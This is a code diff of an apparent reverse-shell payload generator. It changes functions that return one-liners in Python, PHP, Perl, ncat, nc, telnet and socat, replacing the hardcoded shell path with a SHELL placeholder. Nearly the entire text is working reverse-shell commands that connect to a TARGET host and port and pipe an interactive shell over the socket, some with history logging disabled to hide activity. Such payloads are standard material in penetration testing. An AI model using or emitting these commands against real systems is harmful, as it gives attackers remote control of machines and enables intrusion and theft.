@@ -4,15 +4,15 @@ from classes import generate_file_name
 
 
 def REV_PYTHON_TCP():
-    return """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """
+    return """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('SHELL'); s.close();\" """
 
 
 def REV_PYTHON_UDP():
-    return """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """
+    return """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('SHELL'); s.close();\" """
 
 
 def REV_PHP_TCP():
-    return r"""php -r "\$sock=fsockopen('TARGET',PORT);exec('/bin/sh -i <&3 >&3 2>&3');" """
+    return r"""php -r "\$sock=fsockopen('TARGET',PORT);exec('SHELL -i <&3 >&3 2>&3');" """
 
 
 def REV_RUBY_TCP():
@@ -20,7 +20,7 @@ def REV_RUBY_TCP():
 
 
 def REV_PERL_TCP():
-    return r"""perl -e "use Socket;\$i='TARGET';\$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};" """
+    return r"""perl -e "use Socket;\$i='TARGET';\$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('SHELL -i');};" """
 
 
 def REV_PERL_TCP_2():
@@ -44,35 +44,35 @@ def REVERSE_TCLSH():
 
 
 def REVERSE_NCAT():
-    return "ncat TARGET PORT -e /bin/bash"
+    return "ncat TARGET PORT -e SHELL"
 
 
 def REVERSE_NC_TRADITIONAL_1():
-    return "nc TARGET PORT -c /bin/bash"
+    return "nc TARGET PORT -c SHELL"
 
 
 def REVERSE_NC_UDP_1():
-    return """mkfifo fifo ; nc.traditional -u TARGET PORT < fifo | { bash -i; } > fifo"""
+    return """mkfifo fifo ; nc.traditional -u TARGET PORT < fifo | { SHELL -i; } > fifo"""
 
 
 def REVERSE_MKFIFO_NC():
-    return "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TARGET PORT > /tmp/f"
+    return "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|SHELL -i 2>&1|nc TARGET PORT > /tmp/f"
 
 
 def REVERSE_MKNOD_NC():
-    return "if [ -e /tmp/f ]; then rm -f /tmp/f;fi;mknod /tmp/f p && nc TARGET PORT 0</tmp/f|/bin/bash 1>/tmp/f"
+    return "if [ -e /tmp/f ]; then rm -f /tmp/f;fi;mknod /tmp/f p && nc TARGET PORT 0</tmp/f|SHELL 1>/tmp/f"
 
 
 def REVERSE_MKFIFO_TELNET():
-    return "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet TARGET PORT > /tmp/f"
+    return "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|SHELL -i 2>&1|telnet TARGET PORT > /tmp/f"
 
 
 def REVERSE_MKNOD_TELNET():
-    return "if [ -e /tmp/f ]; then rm /tmp/f;fi;mknod /tmp/f p && telnet TARGET PORT 0</tmp/f|/bin/bash 1>/tmp/f"
+    return "if [ -e /tmp/f ]; then rm /tmp/f;fi;mknod /tmp/f p && telnet TARGET PORT 0</tmp/f|SHELL 1>/tmp/f"
 
 
 def REVERSE_SOCAT():
-    return """socat tcp-connect:TARGET:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane"""
+    return """socat tcp-connect:TARGET:PORT exec:"SHELL -li",pty,stderr,setsid,sigint,sane"""
 
 
 def REVERSE_AWK():
